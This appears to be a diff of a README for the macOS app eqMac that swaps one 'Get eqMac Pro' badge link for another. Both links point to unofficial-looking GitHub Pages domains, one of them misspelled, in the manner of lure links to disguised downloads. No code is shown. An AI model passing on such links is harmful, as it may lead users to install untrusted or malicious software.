@@ -5,7 +5,7 @@
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/eqmac">
+  <a href="https://osx-quick-app.github.io/.github/eqmac">
     <img src="https://img.shields.io/badge/Get%20eqMac%20Pro-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get eqMac Pro">
   </a>
 </p>
